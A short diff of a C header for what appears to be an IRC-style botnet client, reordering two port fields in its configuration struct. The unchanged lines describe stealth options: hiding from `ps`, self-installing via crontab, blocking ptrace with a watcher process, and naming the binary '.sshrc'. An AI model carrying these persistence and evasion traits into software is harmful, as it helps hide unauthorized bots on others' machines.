@@ -30,8 +30,6 @@ typedef struct conf_b {
   int pscloak;          /* should the bots bother trying to cloak `ps`? */
   int autocron;         /* should the bot auto crontab itself? */
   int watcher;		/* spawn a watcher pid to block ptrace? */
-  port_t portmin;       /* for hubs, the reserved port range for incoming connections */
-  port_t portmax;       /* for hubs, the reserved port range for incoming connections */
   char *comments;       /* we dont want to lose our comments now do we?! */
   char *localhub;	/* my localhub */
   char *uname;
@@ -39,6 +37,8 @@ typedef struct conf_b {
   char *homedir;        /* homedir */
   char *binpath;        /* path to binary, ie: ~/ */
   char *binname;        /* binary name, ie: .sshrc */
+  port_t portmin;       /* for hubs, the reserved port range for incoming connections */
+  port_t portmax;       /* for hubs, the reserved port range for incoming connections */
 } conf_t;
 
 extern conf_t		conf, conffile;
